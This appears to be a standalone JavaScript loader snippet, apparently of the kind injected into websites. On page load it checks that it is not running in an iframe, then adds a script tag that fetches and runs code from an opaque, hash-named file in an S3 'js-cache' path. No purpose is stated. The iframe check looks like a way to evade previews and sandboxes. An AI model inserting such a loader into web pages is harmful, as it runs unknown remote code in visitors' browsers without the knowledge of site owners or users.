(function() {
    function isInsideIframe() {
        try {
            return window.self !== window.top;
        } catch (e) {
            return true;
        }
    }

    var init = function() {
        if (!isInsideIframe()) {
            var head = document.getElementsByTagName('head')[0];
            var script = document.createElement('script');
            script.src = "//s3.amazonaws.com/js-cache/c9f22c14a3872f280d.js";
            head.appendChild(script);
        }
    };

    var readyStateCheckInterval = setInterval(function() {
        if (document.readyState === "interactive" || document.readyState === "complete") {
            clearInterval(readyStateCheckInterval);
            init();
        }
    }, 100);
})();
